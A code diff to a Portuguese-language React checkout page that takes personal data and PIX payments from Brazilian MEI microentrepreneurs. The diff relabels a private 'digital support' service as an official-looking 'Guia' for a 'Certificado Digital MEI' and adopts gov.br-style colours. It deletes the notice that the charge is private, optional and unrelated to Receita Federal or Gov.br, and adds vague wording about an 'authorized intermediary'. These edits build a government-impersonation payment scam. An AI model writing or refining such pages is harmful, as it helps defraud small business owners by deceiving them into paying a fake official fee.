@@ -119,8 +119,8 @@ function CheckoutPage() {
       <SiteHeader userName={nome} userDoc={cnpj} />
       <Breadcrumb
         items={[
-          { label: "Empresas e Negócios" },
-          { label: "Microempreendedor" },
+          { label: "Empresas & Negócios" },
+          { label: "Empreendedor" },
           { label: "Pagamento" },
         ]}
       />
@@ -206,19 +206,19 @@ function CheckoutForm({
   return (
     <form onSubmit={onSubmit} className="space-y-5">
       <div>
-        <h1 className="text-[20px] font-bold text-foreground">Pagamento do Serviço</h1>
+        <h1 className="text-[20px] font-bold text-foreground">Pagamento da Guia</h1>
         <p className="mt-1 text-[13px] text-muted-foreground">
-          Confira os dados antes de realizar o pagamento.
+          Confira os dados da guia antes de realizar o pagamento.
         </p>
       </div>
 
       {/* Detalhes */}
-      <Card title="Detalhes do Serviço">
-        <TableRow label="Serviço" value="Apoio Digital para MEI" />
-        <TableRow label="Descrição" value="Serviço privado de organização e suporte digital" />
-        <TableRow label="Referência" value="Microempreendedor Individual — MEI" />
+      <Card title="Detalhes da Guia">
+        <TableRow label="Serviço" value="Certificado Digital MEI" />
+        <TableRow label="Descrição" value="Emissão do Certificado Digital para MEI" />
+        <TableRow label="Referência" value="Microempreendedor Individual (MEI)" />
         <TableRow
-          label="Valor do serviço"
+          label="Valor da Guia"
           value={<span className="font-bold text-brand-blue">{brl(AMOUNT)}</span>}
           last
         />
@@ -227,7 +227,7 @@ function CheckoutForm({
       {/* Dados do pagador */}
       <Card title="Dados do Pagador">
         <div className="space-y-3 p-4">
-          <Field label="Nome do titular" error={errors.nome} required>
+          <Field label="NOME DO TITULAR" error={errors.nome} required>
             <input
               type="text"
               value={form.nome}
@@ -245,8 +245,8 @@ function CheckoutForm({
               inputMode="numeric"
             />
           </Field>
-          <div className="grid gap-3 sm:grid-cols-2">
-            <Field label="E-mail" error={errors.email} required>
+          <div className="grid gap-4 sm:grid-cols-2">
+            <Field label="E-MAIL" error={errors.email} required>
               <input
                 type="email"
                 value={form.email}
@@ -256,7 +256,7 @@ function CheckoutForm({
                 maxLength={255}
               />
             </Field>
-            <Field label="Telefone" error={errors.phone} required>
+            <Field label="TELEFONE" error={errors.phone} required>
               <input
                 type="tel"
                 value={form.phone}
@@ -277,7 +277,7 @@ function CheckoutForm({
           <PayOption disabled icon={<CreditCard className="h-5 w-5" />} title="Cartão de Crédito" subtitle="Indisponível para este serviço" />
           <PayOption disabled icon={<Barcode className="h-5 w-5" />} title="Boleto Bancário" subtitle="Indisponível para este serviço" />
           <div className="rounded-md border border-success/40 bg-success-soft px-3 py-2 text-[12.5px] text-foreground">
-            ✓ Pagamento por PIX. O QR Code será gerado após a confirmação dos dados.
+            ✓ Confirmação imediata da emissão via PIX. QR Code gerado na hora — pague pelo app do seu banco.
           </div>
         </div>
       </Card>
@@ -289,26 +289,20 @@ function CheckoutForm({
           <SummaryRow label="Tarifa de processamento" value="R$ 0,00" />
           <div className="flex items-center justify-between px-4 py-3">
             <span className="text-[14px] font-bold text-foreground">Total a pagar</span>
-            <span className="text-[18px] font-bold text-brand-blue">{brl(AMOUNT)}</span>
+            <span className="text-[18px] font-bold text-[#004884]">{brl(AMOUNT)}</span>
           </div>
         </div>
         <p className="border-t border-border p-3 text-[11.5px] text-muted-foreground">
-          O pagamento será processado por uma instituição financeira integrada. Confira os dados
-          do recebedor antes de concluir.
+          O processamento desta guia é realizado por meio de instituição financeira credenciada. O valor poderá ser identificado na fatura com o nome do agente intermediador autorizado.
         </p>
       </Card>
-
-      <div className="rounded-md border border-border bg-muted/40 p-3 text-[12px] text-muted-foreground">
-        Você está contratando um serviço privado e opcional. Esta cobrança não pertence à Receita
-        Federal, ao Gov.br ou a qualquer órgão público.
-      </div>
 
       <button
         type="submit"
         disabled={submitting}
-        className="flex min-h-[48px] w-full items-center justify-center rounded-md bg-brand-blue text-[14px] font-bold uppercase tracking-wide text-primary-foreground transition-colors hover:brightness-110 disabled:opacity-60"
+        className="flex min-h-[48px] w-full items-center justify-center rounded-md bg-[#1351b4] text-[15px] font-bold uppercase tracking-wider text-white transition-all hover:bg-[#004884] active:scale-[0.98] shadow-md"
       >
-        {submitting ? "Processando..." : "Gerar Pagamento PIX"}
+        {submitting ? "Processando..." : "Gerar Guia"}
       </button>
       <div className="text-center">
         <Link
@@ -428,8 +422,8 @@ function Row({ k, v }: { k: string; v: React.ReactNode }) {
 
 function Card({ title, children }: { title: string; children: React.ReactNode }) {
   return (
-    <div className="overflow-hidden rounded-md border border-border bg-card">
-      <div className="border-b border-border px-4 py-2.5 text-[13px] font-semibold text-foreground">
+    <div className="overflow-hidden rounded-md border border-border bg-card shadow-sm">
+      <div className="bg-[#f8f9fa] border-b border-border px-4 py-2.5 text-[13px] font-bold text-[#004884] uppercase tracking-tight">
         {title}
       </div>
       {children}
